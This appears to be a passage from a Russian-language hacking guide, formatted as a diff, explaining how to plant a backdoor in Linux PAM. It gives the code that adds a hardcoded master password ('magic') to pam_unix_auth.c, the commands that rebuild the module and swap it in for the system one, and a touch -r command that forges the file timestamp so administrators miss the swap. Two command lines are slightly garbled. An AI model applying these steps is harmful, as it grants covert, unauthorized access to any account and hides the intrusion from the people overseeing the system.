@@ -1,0 +1,21 @@
+Для того чтобы внести необходимые изменения, скачиваем исходные тексты PAM:
+
+$ http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz
+$ tar -xzf inux-PAM-1.1.8.tar.gz
+Открываем файл Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c и ищем следующие строки:
+
+/* verify the password of this user */
+retval = _unix_verify_password(pamh, name, p, ctrl);
+Сразу после второй строки добавляем проверку нашего пароля (замени magic на свой пароль):
+
+if (strcmp(p,"magic") == 0) {
+    retval = PAM_SUCCESS;
+}
+Собираем и заменяем оригинальный модуль своим:
+
+$ ./configure
+$ make
+$ sudo cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/
+Чтобы админ не заметил подмены, изменяем время создания файла так, чтобы оно совпадало со временем создания других модулей:
+
+$ sudo touch -r /lib/x86_64-linux-gnu/security/pam_ftp.so /lib/x86_64-linux-gnu/security/pam_unix.so
